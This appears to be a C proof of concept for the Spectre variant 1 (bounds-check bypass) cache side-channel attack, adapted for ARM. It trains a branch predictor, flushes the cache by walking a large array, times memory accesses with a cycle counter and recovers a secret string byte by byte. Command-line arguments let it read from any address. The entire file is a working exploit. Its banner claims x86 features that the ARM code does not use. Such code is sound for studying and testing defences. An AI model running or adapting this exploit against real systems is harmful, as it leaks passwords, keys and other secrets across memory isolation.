#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <asm/unistd.h>
#include "sse2neon.h"

#define MAX_TRIES 999
#define NLOOPS 10
#define NOCLFLUSH

/* BEGIN ARM-specific parts: */
static uint32_t __rdtscp() {
	uint32_t pmccntr;
    
    __asm__ volatile("mrc p15, 0, %0, c9, c13, 0" : "=r"(pmccntr));
    return pmccntr * 64;  // Should optimize to << 6
}
/* END ARM-specific parts */

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "It is no secret. All power is one in source and end, I think. Years and distances, stars and candles, water and wind and wizardry, the craft in a man's hand and the wisdom in a tree's root: they all arise together. My name, and yours, and the true name of the sun, or a spring of water, or an unborn child, all are syllables of the great word that is very slowly spoken by the shining of the stars. There is no other power. No other name.";


uint8_t temp = 0;
void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

#define CACHE_FLUSH_ITERATIONS (16384/4)
#define CACHE_FLUSH_STRIDE (16384/2)
uint8_t cache_flush_array[CACHE_FLUSH_STRIDE * CACHE_FLUSH_ITERATIONS];

/* Flush memory using long SSE instructions */
void flush_memory_sse(uint8_t * addr)
{
  float * p = (float *)addr;
  float c = 0.f;
  __m128 i = _mm_setr_ps(c, c, c, c);

  int k, l;
  /* Non-sequential memory addressing by looping through k by l */
  for (k = 0; k < 4; k++)
    for (l = 0; l < 4; l++)
      _mm_store_ps(&p[(l * 4 + k) * 4], i);
}

void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    register uint32_t time1, time2;
    volatile uint8_t * addr;

    int junk2 = 0;
    int l;
    (void)junk2;

    for (i = 0; i < 256; i++)
        results[i] = 0;

    for (tries = MAX_TRIES; tries > 0; tries--) {
        /* Flush array2[256*(0..255)] from cache
           using long SSE instruction several times */
        for (j = 0; j < 16; j++)
          for (i = 0; i < 256; i++)
            flush_memory_sse( & array2[i * 512]);

        uint32_t time_73 = 0;
        uint32_t time_73_count = 0;
        uint32_t time_other = 0;
        uint32_t time_other_count = 0;

        training_x = tries % array1_size;
        for (j = NLOOPS; j >= 0; j--) {
            /* Alternative to using clflush to flush the CPU cache */
            /* Read addresses at 4096-byte intervals out of a large array.
               Do this around 2000 times, or more depending on CPU cache size. */

            for(l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) {
              junk2 = cache_flush_array[l];
            } 

            for (volatile int z = 0; z < 100; z++) {}

            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);
        }


        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = & array2[mix_i * 512];

            __asm__ volatile("dsb");
            time1 = __rdtscp();
            __asm__ volatile("dsb");
            junk = *addr;
            __asm__ volatile("dsb");
            time2 = __rdtscp() - time1;
            __asm__ volatile("dsb");

            if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
                results[mix_i]++;
        }


        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }

        //printf("j = [%d], k = [%d], time_73_avg = [%d], time_other_avg= [%d]\n", j, k, time_73/time_73_count, time_other/time_other_count);

        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
            break;
    }
    results[0] ^= junk;
    value[0] = (uint8_t) j;
    score[0] = results[j];
    value[1] = (uint8_t) k;
    score[1] = results[k];
}

int strncmpcountmatches(char *s1, char *s2, int len) {
    int count = 0;
    for (int i=0; i<len; ++i) {
        if (s1[i] == s2[i]) {
            ++count;
        }
    }
    return count;
}

int main(int argc, const char **argv) {
    int cache_hit_threshold = 120;

    size_t malicious_x = (size_t)(secret - (char * ) array1);

    int len = 438;

    int quietmode = 0;
    if ((argc > 1) && (0 == strncmp(argv[1], "-q", 2))) {
        quietmode = 1;
        argv++; argc--;
    }

    int score[2];
    uint8_t value[2];
    int i;

    for (i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }

    for (i = 0; i < (int)sizeof(cache_flush_array); i++) {
        cache_flush_array[i] = 1;
    }

    if (argc >= 2) {
        sscanf(argv[1], "%d", &cache_hit_threshold);
    }

    if (argc >= 4) {
        sscanf(argv[2], "%p", (void * * )( &malicious_x));

        malicious_x -= (size_t) array1;

        sscanf(argv[3], "%d", &len);
    }

    char exfiltrated[len];

    printf("Using a cache hit threshold of %d.\n", cache_hit_threshold);

    printf("Build: ");
    printf("RDTSCP_SUPPORTED ");
    printf("MFENCE_SUPPORTED ");
    printf("CLFLUSH_SUPPORTED ");
    printf("INTEL_MITIGATION_DISABLED ");
    printf("LINUX_KERNEL_MITIGATION_DISABLED ");
    printf("\n");
    printf("Reading %d bytes:\n", len);

    double lasttime = clock();

    if (quietmode) {
        for (int i=0; i<len; ++i) {
            readMemoryByte(cache_hit_threshold, malicious_x++, value, score);
            char exfiltratedCharacter = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
            exfiltrated[i] = exfiltratedCharacter;
        }
    } else {
        for (int i=0; i<len; ++i) {
            printf("Reading at malicious_x = %p... ", (void * ) malicious_x);
            readMemoryByte(cache_hit_threshold, malicious_x++, value, score);

            printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
            char exfiltratedCharacter = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
            printf("0x%02X=’%c’ score=%d ", value[0],
                    exfiltratedCharacter, score[0]);

            if (score[1] > 0) {
                printf("(second best: 0x%02X=’%c’ score=%d)", value[1],
                        (value[1] > 31 && value[1] < 127 ? value[1] : '?'), score[1]);
            }

            printf("\n");
            exfiltrated[i] = exfiltratedCharacter;
        }
    }
    double time = ((double)(clock()-lasttime))/1000000;

    int nmatches = strncmpcountmatches(secret, exfiltrated, len);
    printf("Time: %f     Matches: %d     Errors: %d     PercentCorrect: %f\n",
            time,
            nmatches,
            len-nmatches,
            100.0*((float) nmatches)/len);

    return (0);
}
